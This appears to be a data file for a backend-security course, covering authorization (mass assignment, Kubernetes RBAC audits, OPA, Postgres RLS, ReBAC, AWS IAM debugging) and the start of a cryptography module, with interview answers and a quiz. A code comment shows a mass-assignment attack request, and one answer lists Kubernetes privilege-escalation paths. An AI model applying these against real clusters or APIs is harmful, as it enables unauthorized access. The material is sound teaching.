        {
          t: 'Prevent mass assignment (BOPLA) in an update endpoint',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Never decode a request body directly into the DB model.</li><li>Use a request DTO with only user-editable fields (pointers for partial updates); <code>DisallowUnknownFields</code>.</li><li>Fields like <code>role</code>, <code>tenant_id</code>, <code>is_verified</code>, <code>balance</code> need separate privileged endpoints.</li></ul>`,
          solution: `// VULNERABLE: json.NewDecoder(r.Body).Decode(&user) then db.Save(user)
// -> attacker sends {"display_name":"x","role":"admin","tenant_id":"other"}

type UpdateProfileRequest struct {
    DisplayName *string \`json:"display_name"\`
    Locale      *string \`json:"locale"\`
}

func (h *H) UpdateProfile(w http.ResponseWriter, r *http.Request) {
    p, _ := PrincipalFrom(r.Context())
    dec := json.NewDecoder(http.MaxBytesReader(w, r.Body, 16<<10))
    dec.DisallowUnknownFields() // "role", "tenant_id" -> 400 instead of silently ignored
    var req UpdateProfileRequest
    if err := dec.Decode(&req); err != nil {
        http.Error(w, "invalid request", http.StatusBadRequest)
        return
    }
    if req.DisplayName != nil && (len(*req.DisplayName) == 0 || len(*req.DisplayName) > 80) {
        http.Error(w, "invalid display_name", http.StatusUnprocessableEntity)
        return
    }
    // user id from the principal, never from the body/path for "self" endpoints
    if err := h.users.UpdateProfile(r.Context(), p.TenantID, p.UserID, req); err != nil {
        http.Error(w, "internal error", http.StatusInternalServerError)
        return
    }
    w.WriteHeader(http.StatusNoContent)
}`,
          lang: 'go'
        },
        {
          t: 'Audit a Kubernetes namespace for RBAC privilege escalation paths',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>List bindings and the roles they reference; look for wildcards, <code>secrets</code>, <code>pods/exec</code>, <code>create pods</code>, <code>escalate</code>/<code>bind</code>/<code>impersonate</code>.</li><li>Check default ServiceAccounts and token automounting.</li><li>Use <code>kubectl auth can-i --list</code> per ServiceAccount.</li></ul>`,
          solution: `NS=payments
kubectl get rolebindings,clusterrolebindings -A -o json | jq -r '
  .items[] | select(.subjects[]?.namespace == "'$NS'") |
  "\\(.kind)/\\(.metadata.name) -> \\(.roleRef.kind)/\\(.roleRef.name) : \\([.subjects[].name] | join(","))"'

# Dangerous verbs/resources across roles used in the namespace
kubectl get roles -n $NS -o json | jq -r '.items[] | .metadata.name as $n | .rules[] |
  select((.verbs | index("*")) or (.resources | index("*")) or (.resources | index("secrets")) or
         (.resources | index("pods/exec")) or (.verbs | index("escalate")) or (.verbs | index("bind")) or
         (.verbs | index("impersonate"))) | "\\($n): \\(.resources) \\(.verbs)"'

# Effective permissions of each service account
for sa in $(kubectl get sa -n $NS -o name | cut -d/ -f2); do
  echo "== $sa"; kubectl auth can-i --list -n $NS --as=system:serviceaccount:$NS:$sa | grep -vE '^(selfsubject|  )'
done

# Who can read secrets / create pods here?
kubectl auth can-i get secrets -n $NS --as=system:serviceaccount:$NS:default
kubectl auth can-i create pods -n $NS --as=system:serviceaccount:$NS:ci-deployer
# Remediate: narrow verbs/resources, resourceNames, automountServiceAccountToken: false where unused`,
          lang: 'bash'
        },
        {
          t: 'Write an OPA policy and evaluate it from Go',
          d: 'medium',
          type: 'coding',
          hint: `<ul><li>Write Rego v1 with <code>default allow := false</code>.</li><li>Embed with <code>rego.New(rego.Query("data.authz.allow"), rego.Module(...))</code>, <code>PrepareForEval</code> once, <code>Eval</code> per request.</li><li>Fail closed on errors; unit test the policy with <code>opa test</code>.</li></ul>`,
          solution: `import "github.com/open-policy-agent/opa/v1/rego"

const policy = \`
package authz

default allow := false

allow if {
    input.subject.tenant_id == input.resource.tenant_id
    some perm in input.subject.permissions
    perm == concat(":", [input.resource.type, input.action])
}

allow if {
    input.action == "read"
    input.resource.owner_id == input.subject.id
}
\`

type Authorizer struct{ q rego.PreparedEvalQuery }

func NewAuthorizer(ctx context.Context) (*Authorizer, error) {
    q, err := rego.New(rego.Query("data.authz.allow"), rego.Module("authz.rego", policy)).PrepareForEval(ctx)
    return &Authorizer{q: q}, err
}

func (a *Authorizer) Allow(ctx context.Context, input map[string]any) bool {
    rs, err := a.q.Eval(ctx, rego.EvalInput(input))
    if err != nil || len(rs) == 0 {
        return false // fail closed
    }
    allowed, ok := rs[0].Expressions[0].Value.(bool)
    return ok && allowed
}

// authz_test.rego
// package authz
// test_cross_tenant_denied if {
//     not allow with input as {"subject": {"id": "u1", "tenant_id": "a", "permissions": ["invoice:read"]},
//                              "action": "read", "resource": {"type": "invoice", "tenant_id": "b", "owner_id": "u2"}}
// }
// $ opa test . -v`,
          lang: 'go'
        },
        {
          t: 'Enforce tenant isolation with PostgreSQL Row-Level Security',
          d: 'medium',
          type: 'hands-on',
          hint: `<ul><li>Enable and FORCE RLS; policy compares <code>tenant_id</code> with <code>current_setting('app.tenant_id')</code>.</li><li>The application role must not own the table or have <code>BYPASSRLS</code>.</li><li>Set the tenant per transaction with <code>set_config(..., true)</code> so pooled connections don't leak it.</li></ul>`,
          solution: `-- schema (run as owner/migration role)
ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
ALTER TABLE invoices FORCE ROW LEVEL SECURITY;
CREATE POLICY tenant_isolation ON invoices
  USING      (tenant_id = current_setting('app.tenant_id', true)::uuid)
  WITH CHECK (tenant_id = current_setting('app.tenant_id', true)::uuid);
GRANT SELECT, INSERT, UPDATE, DELETE ON invoices TO app_rw;   -- app_rw: NOT owner, NO BYPASSRLS

-- Go: set tenant inside each transaction (transaction-local => safe with pgx pools / PgBouncer txn mode)
-- tx, _ := db.BeginTx(ctx, nil)
-- tx.ExecContext(ctx, "SELECT set_config('app.tenant_id', $1, true)", principal.TenantID)
-- rows, _ := tx.QueryContext(ctx, "SELECT id, amount FROM invoices WHERE id = $1", id)
-- tx.Commit()

-- Verify
SET ROLE app_rw;
BEGIN; SELECT set_config('app.tenant_id', '11111111-1111-1111-1111-111111111111', true);
SELECT count(*) FROM invoices;                          -- only tenant 1111 rows
INSERT INTO invoices(id, tenant_id, amount) VALUES (gen_random_uuid(), '22222222-2222-2222-2222-222222222222', 1);
-- ERROR: new row violates row-level security policy
ROLLBACK;
-- Without set_config: current_setting(..., true) is NULL -> no rows visible (fail closed)`,
          lang: 'text'
        },
        {
          t: 'Model Google Drive-style sharing with ReBAC',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Types: user, group, folder, document; relations owner/editor/commenter/viewer, parent, public link.</li><li>Inheritance from parent folders; group membership; "anyone with the link".</li><li>Listing: ListObjects or a search index filtered by permitted IDs.</li><li>Consistency: new-enemy problem when unsharing then adding content.</li></ul>`,
          solution: `Model: see the OpenFGA model in this module, extended with:
  define commenter: [user, group#member] or editor or commenter from parent
  define viewer: [user, user:*, group#member, link#holder] or commenter or viewer from parent

Writes (from the app, via outbox to keep the tuple store in sync with the primary DB):
  create doc in folder   -> document:D#parent@folder:F, document:D#owner@user:U
  share with group       -> document:D#editor@group:G#member
  move doc               -> delete old parent tuple, write new one (same transaction batch)
  public link            -> document:D#viewer@user:*

Reads:
  open doc   -> Check(user, viewer, document:D) with "at least as fresh as" consistency token stored on the doc
  list "shared with me" -> ListObjects(user, viewer, type document) for small sets; for large sets, a search index
               of docs + periodic permission-aware filtering (or SpiceDB LookupResources with pagination)
  share dialog -> Check(user, can_share, document:D); ListUsers for "who has access"

New-enemy problem: Bob removed from folder (write returns token T1), then secret doc added (token T2 stored with doc).
  Check for doc uses T2 => evaluated at a snapshot after T1 => Bob denied.
Performance: cache checks per request; keep hierarchy depth bounded; monitor p99 check latency (< 10ms target).`,
          lang: 'text'
        },
        {
          t: 'Design authorization for a multi-tenant B2B SaaS',
          d: 'hard',
          type: 'design',
          hint: `<ul><li>Layers: tenant isolation &rarr; role/permission (per tenant, customer-defined roles?) &rarr; object relationships &rarr; contextual conditions.</li><li>Where: gateway (coarse), service (fine), DB (RLS backstop).</li><li>Admin UX: custom roles, audit, access reviews; support staff access (break-glass, time-bound, customer-approved).</li></ul>`,
          solution: `1. Identity: token carries sub, tenant_id, roles (tenant-scoped), acr. Tenant is never taken from input.
2. Isolation: pool model with tenant_id on every row + Postgres RLS; enterprise tier can get silo DB.
   Per-tenant KMS data keys for sensitive columns/files.
3. Permissions: fixed catalogue of resource:action permissions; built-in roles + customer-defined custom roles
   (sets of permissions) stored per tenant.
4. Object-level: ReBAC (OpenFGA) for projects/folders/sharing; tuples keyed with tenant prefix
   (project:t42/p7) and a model that never relates objects across tenants.
5. Conditions: ABAC rules in OPA/Cedar (e.g. export requires acr=mfa and managed device; approvals <= limit, SoD).
6. Enforcement: gateway checks token + coarse scope; service calls authz library (in-process, < 1 ms) and
   OpenFGA for relationships; every repository call is tenant-scoped; fail closed.
7. Support access: staff use a separate IdP; JIT, ticket-linked, customer-visible, time-boxed grants; all logged.
8. Governance: audit log of every grant and every denied request; quarterly access reviews exported to tenant admins;
   cross-tenant negative tests on every endpoint in CI; pentest focused on BOLA/BFLA.`,
          lang: 'text'
        },
        {
          t: 'Debug an AWS AccessDenied using policy evaluation logic',
          d: 'hard',
          type: 'debug',
          hint: `<ul><li>Read the error: newer AWS errors state the policy type that denied (SCP, permissions boundary, session policy, resource policy, identity policy).</li><li>Walk the evaluation order: explicit deny anywhere &rarr; SCP/RCP &rarr; resource policy &rarr; boundary &rarr; session policy &rarr; identity policy.</li><li>Check KMS key policy for encrypted resources.</li></ul>`,
          solution: `Error: User: arn:aws:sts::111122223333:assumed-role/orders-task/abc is not authorized to perform:
       s3:GetObject on resource: arn:aws:s3:::acme-invoices/t42/inv.pdf
       because no identity-based policy allows the s3:GetObject action

Walkthrough:
1. aws sts get-caller-identity                       -> confirm which role the pod really uses (IRSA / Pod Identity)
2. aws iam list-attached-role-policies / get-role-policy -> identity policy allows s3:GetObject on acme-invoices/*?
3. Permissions boundary on the role?                 -> must also allow s3:GetObject
4. Bucket policy: explicit Deny with Condition aws:SourceVpce? -> request must come via the VPC endpoint
5. SCP/RCP in the org: region or service restrictions
6. Object encrypted with SSE-KMS                     -> role also needs kms:Decrypt AND the KMS key policy must allow it
7. Use IAM Policy Simulator / CloudTrail event (errorCode, errorMessage) to confirm

Typical root causes: wrong role (default node role instead of IRSA), missing kms:Decrypt, bucket policy deny
without VPC endpoint, resource ARN typo (bucket vs bucket/*).`,
          lang: 'text'
        }
      ],
      interviewFocus: [
        {
          q: 'RBAC vs ABAC vs ReBAC — when would you use each?',
          a: `<ul>
<li><strong>RBAC</strong> when access follows job functions and the set of roles is small and stable (admin consoles, internal tools). Easy to audit ("who has role X?"). Breaks down with per-object or contextual rules — role explosion.</li>
<li><strong>ABAC</strong> when decisions depend on context: amount limits, data classification, region, time, device posture, MFA level. Very expressive; harder to answer "who can access X?" and requires trustworthy attributes.</li>
<li><strong>ReBAC</strong> when access follows relationships: sharing, ownership, hierarchies (org &rarr; project &rarr; folder &rarr; document), group membership. Naturally answers both "can U access O?" and "what can U access?" Needs a dedicated, consistent tuple store (OpenFGA/SpiceDB).</li>
</ul>
<p>Real systems are <strong>hybrids</strong>: tenant isolation + RBAC permissions for capabilities + ReBAC for object access + ABAC conditions for context, behind a single authorization API so handlers call <code>Can(principal, action, resource)</code> and the model can evolve.</p>`
        },
        {
          q: 'How do you prevent BOLA/IDOR across a large API surface?',
          a: `<ul>
<li><strong>Make the secure path the only path</strong>: repository/data-access functions require a principal and always scope by tenant/owner; there is no unscoped "get by id" in service code.</li>
<li><strong>Identity from the token only</strong>: tenant and user come from verified claims, never headers, path or body.</li>
<li><strong>Central authorization helper</strong> (<code>authz.Can</code>) per object; consistent 404 for foreign objects.</li>
<li><strong>Defense in depth</strong>: Postgres RLS or per-tenant schemas so a missed check still fails.</li>
<li><strong>Explicit DTOs</strong> to block mass assignment and over-exposure (BOPLA).</li>
<li><strong>Testing</strong>: generated cross-tenant test matrix for every route (from the OpenAPI spec), run in CI; DAST and pentests focused on IDs; lint rules that flag handlers without authz calls.</li>
<li><strong>Monitoring</strong>: alert on high 403/404 rates per user (enumeration attempts).</li>
</ul>
<p>Random UUIDs help against enumeration but are not authorization — IDs leak through URLs, logs and shared links.</p>`
        },
        {
          q: 'Explain Google Zanzibar and the new-enemy problem.',
          a: `<p>Zanzibar is Google's global authorization system storing <strong>relation tuples</strong> (<code>object#relation@user</code>) and namespace configs with <strong>userset rewrite rules</strong> (e.g. viewer includes editors and viewers of the parent folder). Clients call <strong>Check</strong>, <strong>Expand</strong>, <strong>Read/Write</strong>, and list-style lookups. It serves millions of checks per second with low latency through caching, request hedging and denormalized group indexes (Leopard).</p>
<p><strong>New-enemy problem</strong>: ordering of ACL changes and content changes. Example: Alice removes Bob from a folder, then puts a confidential doc in it. If Bob's check is evaluated against a stale replica that still has his membership but sees the new doc, Bob gains access. Zanzibar solves it with <strong>zookies</strong>: when content is modified, the client gets a consistency token reflecting a snapshot after the ACL change; checks on that content are evaluated at a snapshot at least that fresh (Spanner TrueTime gives external consistency).</p>
<p>Open-source equivalents (SpiceDB ZedTokens, OpenFGA consistency options) expose the same trade-off: fully consistent checks cost latency; "at least as fresh as" tokens give correctness where needed.</p>`
        },
        {
          q: 'Centralized policy engine or authorization in code — what are the trade-offs?',
          a: `<table>
<thead><tr><th></th><th>In-code checks</th><th>Policy engine (OPA/Cedar/OpenFGA)</th></tr></thead>
<tbody>
<tr><td>Latency</td><td>none</td><td>library: &lt;1 ms; sidecar/remote: network hop</td></tr>
<tr><td>Consistency across services</td><td>drifts, reimplemented per language</td><td>single policy source, versioned and tested</td></tr>
<tr><td>Auditability</td><td>hard to answer "what are the rules?"</td><td>policies readable, decision logs</td></tr>
<tr><td>Availability</td><td>no extra dependency</td><td>must design for engine outage (fail closed, local replicas)</td></tr>
<tr><td>Data</td><td>direct DB access</td><td>needs attributes in input or synchronized data</td></tr>
</tbody>
</table>
<p>My default: a thin authorization library in each service (PEP) that evaluates policies locally (embedded OPA/Cedar, bundles distributed centrally) for low latency, plus a ReBAC service for relationship checks where needed. Object loading and tenant scoping stay in code, because the service owns the data.</p>`
        },
        {
          q: 'What are the non-obvious privilege escalation paths in Kubernetes RBAC?',
          a: `<ul>
<li><strong>create pods</strong> (or deployments, jobs...) in a namespace: mount any Secret or ServiceAccount token in that namespace, or run privileged pods if admission doesn't block it &rarr; node takeover.</li>
<li><strong>get/list/watch secrets</strong>: list returns contents, not just names.</li>
<li><strong>pods/exec</strong>, <strong>pods/attach</strong>, <strong>pods/portforward</strong>: run commands in other workloads with their identities.</li>
<li><strong>escalate</strong> / <strong>bind</strong> on roles: grant yourself permissions you don't hold.</li>
<li><strong>impersonate</strong> users/groups/serviceaccounts (e.g. <code>system:masters</code>).</li>
<li><strong>nodes/proxy</strong>: talk to the kubelet API directly, bypassing audit and admission.</li>
<li><strong>patch/update</strong> on RoleBindings, webhook configurations, or CRDs consumed by privileged controllers.</li>
<li><strong>serviceaccounts/token create</strong>: mint tokens for powerful service accounts.</li>
</ul>
<p>Mitigations: least-privilege namespaced Roles, Pod Security Admission (restricted), admission policies (Kyverno/Gatekeeper/ValidatingAdmissionPolicy), disable token automount, audit with <code>kubectl auth can-i --list</code> and tools like rbac-police/KubiScan.</p>`
        }
      ],
      quiz: [
        { q: 'Why should application code check permissions rather than role names?', a: 'Roles become configuration that can change without code changes; checks stay stable and fine-grained.' },
        { q: 'What do PEP and PDP stand for?', a: 'Policy Enforcement Point (intercepts and enforces) and Policy Decision Point (evaluates policies and decides).' },
        { q: 'What is a relation tuple in Zanzibar-style ReBAC?', a: 'A fact of the form object#relation@subject, e.g. doc:1#viewer@user:alice.' },
        { q: 'In Cedar, what happens when both a permit and a forbid policy match?', a: 'Forbid overrides permit; the request is denied.' },
        { q: 'What does OWASP API1:2023 BOLA mean?', a: 'Broken Object Level Authorization: the API does not verify that the caller may access the specific object referenced by the ID.' },
        { q: 'Which Kubernetes command checks what a service account can do?', a: 'kubectl auth can-i <verb> <resource> --as=system:serviceaccount:<ns>:<name> (or --list for everything).' },
        { q: 'In AWS IAM, what overrides any Allow?', a: 'An explicit Deny in any applicable policy (identity, resource, SCP/RCP, boundary, session).' },
        { q: 'Why must the app database role not have BYPASSRLS or own the table when using Postgres RLS?', a: 'Table owners and BYPASSRLS roles skip row-level security (unless FORCE is set for owners), so isolation would silently not apply.' }
      ],
      resources: [
        { title: 'OWASP Authorization Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html', type: 'docs' },
        { title: 'OWASP API Security Top 10 (2023)', url: 'https://owasp.org/API-Security/editions/2023/en/0x11-t10/', type: 'docs' },
        { title: 'OWASP Insecure Direct Object Reference Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html', type: 'docs' }
      ]
    },
    // ───────────────────────────────────────────── Module 9 ─────────────────────────────────────────────
    {
      n: 9,
      title: 'Cryptography Essentials',
      summary: `The cryptography a backend engineer must use correctly (not invent): hashes vs HMACs vs password hashes, authenticated symmetric encryption with AES-GCM and its nonce rules, RSA and elliptic-curve cryptography, Diffie-Hellman key exchange and signatures, envelope encryption with a KMS, secure randomness, post-quantum migration, and the classic mistakes reviewers look for.`,
      topics: [
        {
          title: 'Hashing vs HMAC vs Password Hashing',
          def: `<p>A <strong>cryptographic hash</strong> maps any input to a fixed-size digest with three properties: <strong>preimage resistance</strong> (can't find input from digest), <strong>second-preimage resistance</strong> and <strong>collision resistance</strong> (can't find two inputs with the same digest).</p>
<table>
<thead><tr><th>Need</th><th>Primitive</th><th>Go</th></tr></thead>
<tbody>
<tr><td>Integrity / fingerprint / content addressing</td><td>SHA-256, SHA-512, SHA-3, BLAKE2/3</td><td><code>crypto/sha256</code>, <code>crypto/sha3</code> (Go 1.24)</td></tr>
<tr><td>Message authentication with a shared key</td><td><strong>HMAC</strong>-SHA-256</td><td><code>crypto/hmac</code> + <code>hmac.Equal</code></td></tr>
<tr><td>Password storage</td><td>Argon2id, scrypt, bcrypt</td><td><code>golang.org/x/crypto/argon2</code></td></tr>
<tr><td>Deriving keys from a strong secret</td><td><strong>HKDF</strong></td><td><code>crypto/hkdf</code> (Go 1.24)</td></tr>
<tr><td>Proof of origin with non-repudiation</td><td>digital signature (Ed25519, ECDSA)</td><td><code>crypto/ed25519</code></td></tr>
</tbody>
</table>
<p><strong>Broken</strong>: MD5 and SHA-1 have practical collisions (SHAttered, 2017) — never for signatures or certificates; acceptable only for non-security checksums.</p>
<p><strong>Why HMAC and not <code>SHA256(secret || message)</code></strong>: SHA-2 is a Merkle–Damgård construction vulnerable to <strong>length-extension</strong> attacks — knowing <code>H(secret||m)</code> lets an attacker compute <code>H(secret||m||padding||extra)</code> without the secret. HMAC's nested construction (and SHA-3/BLAKE) avoids this.</p>
<p><strong>Why not a plain hash for passwords</strong>: hashes are fast by design; passwords are low-entropy, so attackers brute-force them. Password hashing needs slow, salted, memory-hard functions.</p>
<p>Always compare MACs and tokens with constant-time functions (<code>hmac.Equal</code>, <code>subtle.ConstantTimeCompare</code>) to avoid timing side channels.</p>`,
          interview: 'Map each need to the right primitive: hash for integrity, HMAC for authenticity with a shared key, signature for public verifiability/non-repudiation, KDF for keys, slow hash for passwords. Explain length extension and why HMAC exists.',
          examples: [
            {
              label: 'Hash, HMAC and HKDF in Go',
              lang: 'go',
              code: `digest := sha256.Sum256(fileBytes)                 // integrity / dedup key
fmt.Printf("sha256=%x\\n", digest)

mac := hmac.New(sha256.New, key)                     // authenticity with shared key
mac.Write(message)
tag := mac.Sum(nil)
ok := hmac.Equal(tag, receivedTag)                   // constant-time

// Derive independent subkeys from one master secret (Go 1.24+ crypto/hkdf)
encKey, _ := hkdf.Key(sha256.New, masterSecret, salt, "orders/v1/encryption", 32)
macKey, _ := hkdf.Key(sha256.New, masterSecret, salt, "orders/v1/mac", 32)`
            }
          ]
        },
        {
          title: 'Symmetric Encryption: AES-GCM, AEAD and Nonces',
          def: `<p>Use <strong>authenticated encryption with associated data (AEAD)</strong>: it provides confidentiality <em>and</em> integrity in one primitive. Default choices: <strong>AES-256-GCM</strong> (hardware-accelerated almost everywhere) or <strong>ChaCha20-Poly1305</strong> (fast without AES hardware).</p>
<ul>
<li>Inputs: key (32 bytes), <strong>nonce</strong> (12 bytes for GCM), plaintext, <strong>associated data</strong> (authenticated but not encrypted — e.g. tenant id, record id, schema version). Output: ciphertext + 16-byte tag.</li>
<li>Decryption fails if any bit of ciphertext, tag, nonce or AAD changed. AAD binds the ciphertext to its context: a ciphertext copied from tenant A's row to tenant B's row fails to decrypt.</li>
</ul>
<p><strong>The nonce rule</strong>: a (key, nonce) pair must <strong>never</strong> be reused. GCM nonce reuse leaks the XOR of the two plaintexts (CTR keystream reuse) <em>and</em> lets an attacker recover the GHASH authentication key and forge messages.</p>
<ul>
<li>Random 96-bit nonces are fine up to about 2<sup>32</sup> messages per key (birthday bound); rotate keys well before that, or use counters, or <strong>XChaCha20-Poly1305</strong> (192-bit random nonces), or nonce-misuse-resistant <strong>AES-GCM-SIV</strong>.</li>
<li>Go 1.24 added <code>cipher.NewGCMWithRandomNonce</code>, which generates and prepends the nonce for you.</li>
</ul>
<p><strong>Avoid</strong>: ECB (identical blocks &rarr; identical ciphertext — the "ECB penguin"), CBC/CTR without a MAC (malleable; CBC padding-oracle attacks), static or zero IVs, and encrypting with a key derived from a password without a proper KDF. Encryption does not provide authenticity unless it is AEAD.</p>`,
          interview: 'Say "AEAD" early. Explain what AAD is for (context binding), why GCM nonce reuse is catastrophic (keystream XOR + auth key recovery), the 2^32 random-nonce limit, and alternatives (XChaCha20-Poly1305, GCM-SIV).',
          examples: [
            {
              label: 'AES-256-GCM with associated data',
              lang: 'go',
              code: `func Encrypt(key, plaintext, aad []byte) ([]byte, error) {
    block, err := aes.NewCipher(key) // 32-byte key => AES-256
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    nonce := make([]byte, gcm.NonceSize()) // 12 bytes
    rand.Read(nonce)                       // crypto/rand
    return gcm.Seal(nonce, nonce, plaintext, aad), nil // nonce || ciphertext || tag
}

func Decrypt(key, data, aad []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }
    ns := gcm.NonceSize()
    if len(data) < ns+gcm.Overhead() {
        return nil, errors.New("ciphertext too short")
    }
    return gcm.Open(nil, data[:ns], data[ns:], aad) // error if tampered or wrong AAD
}

// aad := []byte("tenant=t42;table=customers;column=ssn;id=c_981")`
            }
          ]
        },
        {
          title: 'Asymmetric Cryptography: RSA, ECC and Post-Quantum',
          def: `<p>Public-key cryptography uses a key pair: the <strong>public key</strong> encrypts or verifies; the <strong>private key</strong> decrypts or signs. It is slow, so real systems use it to <em>establish or protect symmetric keys</em> (hybrid encryption) and to sign.</p>
<table>
<thead><tr><th>Family</th><th>Recommended</th><th>Notes</th></tr></thead>
<tbody>
<tr><td>RSA</td><td>&ge; 2048-bit (3072 for long-term); <strong>OAEP</strong> for encryption, <strong>PSS</strong> for signatures</td><td>PKCS#1 v1.5 encryption is vulnerable to Bleichenbacher padding-oracle attacks; large keys and signatures</td></tr>
<tr><td>ECC (NIST curves)</td><td>P-256 (&asymp; RSA-3072 strength), P-384</td><td>ECDSA, ECDH; compact; widely supported incl. HSMs</td></tr>
<tr><td>Curve25519 family</td><td><strong>X25519</strong> (key exchange), <strong>Ed25519</strong> (signatures)</td><td>fast, simple, misuse-resistant; Ed25519 is deterministic</td></tr>
</tbody>
</table>
<p><strong>Post-quantum cryptography</strong>: a large quantum computer running Shor's algorithm would break RSA and ECC. NIST standardized <strong>ML-KEM</strong> (FIPS 203, key encapsulation, formerly Kyber), <strong>ML-DSA</strong> (FIPS 204, signatures, formerly Dilithium) and <strong>SLH-DSA</strong> (FIPS 205, hash-based signatures) in August 2024.</p>
<ul>
<li>The urgent threat is <strong>"harvest now, decrypt later"</strong>: recorded TLS traffic could be decrypted in future. Hence <strong>hybrid key exchange</strong> <code>X25519MLKEM768</code> is already deployed in TLS 1.3 (Chrome, Firefox, Cloudflare) and is enabled by default in Go's <code>crypto/tls</code> since Go 1.24 (which also ships <code>crypto/mlkem</code>) and in OpenSSL 3.5. A hybrid combines a classical and a post-quantum KEM, so the session stays secure unless <em>both</em> are broken.</li>
<li>Go gotchas: setting <code>tls.Config.CurvePreferences</code> explicitly (e.g. to <code>[X25519, P256]</code> for "hardening") silently drops the hybrid group — leave it unset or include <code>tls.X25519MLKEM768</code>; <code>GODEBUG=tlsmlkem=0</code> disables it; Go 1.25+ exposes the negotiated group as <code>ConnectionState.CurveID</code>. The hybrid key share adds about 1.1 KB to the ClientHello, which can split it across packets and trip old middleboxes — test through your load balancers and proxies.</li>
<li>Signatures/certificates migrate later (no retroactive risk) and are harder: ML-DSA keys and signatures are kilobytes, which inflates certificate chains. Prepare with crypto-agility (inventory where algorithms are hard-coded). Regulatory timelines: NIST IR 8547 (PQC transition guidance) deprecates RSA/ECC at 112-bit security after 2030 and disallows them after 2035; NSA CNSA 2.0 sets similar dates for national-security systems.</li>
<li>Symmetric crypto is largely fine: AES-256 and SHA-256/384 remain secure (Grover only halves effective strength).</li>
</ul>`,
          interview: 'Know key-size equivalences (P-256 ~ RSA-3072), OAEP vs v1.5, PSS, and why Ed25519/X25519 are preferred. Post-quantum is a current topic: name ML-KEM/ML-DSA, explain harvest-now-decrypt-later and hybrid X25519MLKEM768 in TLS.',
          examples: [
            {
              label: 'Check whether a server negotiates hybrid post-quantum key exchange',
              lang: 'bash',
              code: `# OpenSSL 3.5+ supports ML-KEM groups natively
openssl s_client -connect www.cloudflare.com:443 -groups X25519MLKEM768 -brief </dev/null 2>&1 | grep -iE 'protocol|group|cipher'

# In Go (1.24+), crypto/tls offers X25519MLKEM768 by default; inspect the negotiated group in tests:
#   state := conn.ConnectionState()
#   fmt.Println(state.Version == tls.VersionTLS13, state.CurveID) // CurveID field: Go 1.25+, prints X25519MLKEM768
# Pitfall: tls.Config{CurvePreferences: []tls.CurveID{tls.X25519}} removes the hybrid group again.`
            }
          ]
        },
        {
          title: 'Key Exchange (DH/ECDHE) and Digital Signatures',
          def: `<p><strong>Diffie-Hellman</strong> lets two parties derive a shared secret over a public channel. With elliptic curves (<strong>ECDHE</strong>, e.g. X25519):</p>
<ol>
<li>Alice generates an ephemeral private scalar <em>a</em> and sends public point <em>aG</em>; Bob sends <em>bG</em>.</li>
<li>Each computes the shared point: Alice <em>a(bG)</em>, Bob <em>b(aG)</em> — equal. An eavesdropper seeing <em>aG</em> and <em>bG</em> cannot compute <em>abG</em> (ECDH problem).</li>
<li>Both feed the shared secret into a <strong>KDF</strong> (HKDF) to derive symmetric session keys.</li>
<li>Ephemeral keys are discarded after the session &rarr; <strong>forward secrecy</strong>: later theft of the server's long-term private key cannot decrypt recorded sessions.</li>
</ol>
<p>Plain DH is <strong>unauthenticated</strong>: a man-in-the-middle can run two exchanges. TLS fixes this by having the server <strong>sign</strong> the handshake transcript with its certificate key (CertificateVerify).</p>
<p><strong>Digital signatures</strong>: the signer computes <code>sig = Sign(privateKey, message)</code>; anyone with the public key checks <code>Verify(publicKey, message, sig)</code>. Properties: integrity, authenticity, and <strong>non-repudiation</strong> (only the private-key holder could sign). Uses: TLS certificates and handshakes, JWT/JWS, code and container signing (cosign), Git commits, software updates, SAML.</p>
<p>Pitfalls: <strong>ECDSA nonce reuse or bias leaks the private key</strong> (Sony PS3 2010, numerous wallet thefts) — use RFC 6979 deterministic nonces or Ed25519; verify against the <em>right</em> public key obtained through a trusted channel (certificate chain, pinned key, JWKS from configured issuer); and sign unambiguous encodings (canonical bytes, domain separation) so a signature can't be reinterpreted.</p>`,
          interview: 'Walk through ECDHE in four steps, explain forward secrecy and why DH needs authentication (signatures/certificates). For signatures, cover what they guarantee, where they are used, and the ECDSA nonce-reuse key leak.',
          examples: [
            {
              label: 'X25519 key agreement + Ed25519 signature in Go',
              lang: 'go',
              code: `// Key agreement (crypto/ecdh)
alicePriv, _ := ecdh.X25519().GenerateKey(rand.Reader)
bobPriv, _ := ecdh.X25519().GenerateKey(rand.Reader)
s1, _ := alicePriv.ECDH(bobPriv.PublicKey())
s2, _ := bobPriv.ECDH(alicePriv.PublicKey())
fmt.Println(bytes.Equal(s1, s2)) // true; derive keys with HKDF, never use s1 directly

// Signature (crypto/ed25519)
pub, priv, _ := ed25519.GenerateKey(rand.Reader)
msg := []byte("release v1.4.2 sha256=9f2c...")
sig := ed25519.Sign(priv, msg)
fmt.Println(ed25519.Verify(pub, msg, sig)) // true`
            }
          ]
        },
        {
          title: 'Envelope Encryption and Key Management Services',
          def: `<p><strong>Envelope encryption</strong> is how cloud services and well-built applications encrypt data at scale:</p>
<ol>
<li>Ask the KMS for a <strong>data encryption key (DEK)</strong>: it returns the plaintext DEK and the same DEK encrypted under a <strong>key encryption key (KEK)</strong> that never leaves the KMS/HSM (AWS <code>GenerateDataKey</code>).</li>
<li>Encrypt the data locally with the plaintext DEK (AES-256-GCM), then wipe the plaintext DEK from memory.</li>
<li>Store the <strong>wrapped DEK</strong> next to the ciphertext.</li>
<li>To decrypt, send the wrapped DEK to KMS <code>Decrypt</code> (IAM-authorized, audited), get the DEK, decrypt locally. Cache DEKs briefly to cut latency and cost.</li>
</ol>
<p><strong>Why</strong>: bulk data never goes to the KMS (fast, no size limits); the KEK is protected by an HSM (FIPS 140-3) with access control and audit logs (CloudTrail); <strong>KEK rotation</strong> only requires re-wrapping DEKs, not re-encrypting data; <strong>per-tenant KEKs</strong> give isolation and <strong>crypto-shredding</strong> — delete/disable the tenant's key and all its data becomes unreadable (useful for GDPR erasure across backups).</p>
